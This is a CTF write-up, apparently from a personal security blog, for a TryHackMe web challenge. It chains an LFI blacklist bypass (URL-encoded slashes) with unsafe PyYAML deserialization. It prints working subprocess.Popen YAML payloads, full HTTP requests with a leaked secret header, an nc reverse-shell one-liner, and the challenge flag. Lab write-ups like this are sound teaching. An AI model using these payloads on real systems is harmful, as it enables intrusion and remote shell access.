---
title: 'LFI + Unsafe YAML Deserialization leads to RCE'
description: "A TryHackMe Industrial Intrusion CTF 2025 write-up: chaining a blacklist-bypass LFI with an unsafe PyYAML loader to read source code and get remote code execution."
pubDate: 2025-07-04
tags: [remote-code-execution, ctf-writeup, insecure-deserialization, thm, migrated]
originalUrl: https://muslimfrompk.medium.com/task-11-persistence-tryhackme-industrial-intrusion-ctf-2025-df75edefca34
---

**Category**: Web

**Difficulty**: Medium

## Description

> *After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.*
>
> *As a Black Echo red-team specialist, you must penetrate the compromised portal, unravel its hidden persistence mechanism, and neutralise the backdoor before it can be reactivated. You can access the portal via: `http://MACHINE_IP:8080/`*

## Methodology

From the challenge description we know that port 8080 holds what we need - So, no need to do port scanning! Let's break it down - one step at a time.

### Step 1: Use the app as intended

Spawn the target machine by clicking on the Start Machine and wait until the machine is fully up(it should take no longer than 3-4 minutes).

Now access the target web app by visiting `http://<your-machine-ip>:8080` as stated in the challenge description. - (Remember to replace `<your-machine-ip>` with the actual machine IP.)

Spend some time understanding the app logic and what is its intended use.

### Step 2: Information Gathering

After poking around for some time, we can clearly see that there are four main sections available on the target portal as follows:

1. **Dashboard** — Includes a couple of internal IPs
2. **Config Updater** — (Potentially) allows uploading new YAML config
3. **Logs** — Includes some debug info and file paths.
4. **Telemetry** — For viewing internal OT sensor data in the form of a chart.

Viewing the page source code does not reveal anything interesting so we will skip it.

### Step 3: Information Analysis

Out of the four discovered sections only two of them stand out as potential entry-points for our attack because:

1. ***Config Updater*** consists of a HTML form which (apparently) allows us to update the portal's YAML config file. *Maybe* we can upload a **RCE** exploit or other potentially dangerous files? But unfortunately, Upon submitting the form we get a 403 Access Denied error so we will leave it as is for now.
2. *Logs* section shows us some debug logs which reveal:

- A password-like string: `secr3tTM192d390`
- Full Path to the app's source code: `/opt/hmi/app.py`
- Full path to another Python file: `/opt/hmi/updater.py` (Probably, the source code for YAML config updater).
- Examining the URL for Logs section reveals that a query parameter named `name` is being used to read the logs like: `http://<your-machine-ip>:8080/logs/view?name=debug.log` - Maybe we can try path traversal?

### Step 3: LFI Exploitation

- We start by testing the `name` parameter for LFI in the Logs section.
- If we change the value of `name` parameter from `debug.log` to `nothing.log` it displays the Log Not Found with status code 404 - That was expected, nah?
- Now we try to change the value to an obsolete path like the one we discovered earlier(in step 2) `/opt/hmi/app.py` . It threw another error: No logs found with a 400 Bad Request status code. Did you notice the difference in response? I did! This means the app is treating `nothing.log` and `/opt/hmi/app.py` differently but why?
- Maybe coz of the extension? Let's try changing the `name` param's value to `/opt/hmi/app.log` but it again threw the same 400 Bad Request error. Perhaps, the app is giving the error due the forward slash (/) in the value?
- Let's try changing the value to `\opt\hmi\app.py` (now with backslash) and we get our initial 404 Not Found error back. This means the app is using some kind of black-list but after some trial and error we realize that we only get the 400 Bad Request error code when using the forward slash in the `name` parameter's value and not for any other symbol including %
- Let's try to bypass the blacklist by URL encoding the path as we are allowed to use the % symbol. Try changing the value to `%2fopt%2fhmi%2fapp.py` and boom! We get access to app's source code. Similarly, we can change the value to `%2fopt%2fhmi%2fupdate.py` to get Config Updater 's source code.

### Step 4: Reviewing The Source Code

- Upon reviewing the source code of `app.py` we can clearly see that the app gives a status code when a slash `\` is found in the `name` parameter's value.
- The request to `/config/update` is handled by a function which checks for:

1. `X-FTW` header with a hard-coded secret value(which we found in step 2 as well)
2. Content-type header with a value of `application/x-yaml`
3. and then passes the request body as an argument to another function defined in `update.py` file.

- Upon viewing the source code of `update.py` we notice that the updater function takes our payload from the request body and tries to parse it as YAML using `yaml.UnsafeLoader` YAML loader.
- The config updater function in `update.py` also writes the output of the YAML parsing to a log file named `loader.log`.

### Step 5: RCE Exploitation

- If we do a bit of research on the YAML loader being used we come to know that it's prone to Unsafe YAML Deserialization attacks leading to Remote Code Execution
- Let's try uploading a basic YAML deserialization to RCE payload:

```yaml
!!python/object/apply:subprocess.Popen
- ["ls"]
```

- The HTTP request to upload our payload will look like this:

```http
POST /config/update HTTP/1.1
...... ....
Content-type: application/x-yaml
X-FTW: secr3tTM192d390 .....

!!python/object/apply:subprocess.Popen
- ["ls"]
```

- After sending the request, visit `http://<your-machine-ip>:8080/logs/view?name=loader.log` . At the bottom we can see the output of the YAML deserializer but it seems like the output of our the payload is not returned back to us due to the nature of `subprocess.Popen`
- Let's try to get reverse shell using this payload:

```yaml
!!python/object/apply:subprocess.Popen
- ["sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your-machine-ip> 5555 >/tmp/f"]
```

- Let's first setup a listener on our attack machine and then send the request above with the updated payload like:

```http
POST /config/update HTTP/1.1
...... ....
Content-type: application/x-yaml
X-FTW: secr3tTM192d390 .....

!!python/object/apply:subprocess.Popen
- ["sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your-machine-ip> 5555 >/tmp/f"]
```

- We should soon receive a reverse shell on our listener(if everything was setup correctly). We can list the files using `ls` command then use `cat *.txt` command to print the **flag**

**Flag:** `THM{Sn34ky_B4ckd0or_23144}`

That's all for today!

> *I also regularly write on [my personal blog](https://muslimfrompk.gitbook.io) and regularly share my experiences/tips about Bug Bounty, and CTFs, on [LinkedIn](https://linkedin.com/in/MuslimFromPK). Feel free to reach out if you need any help!*
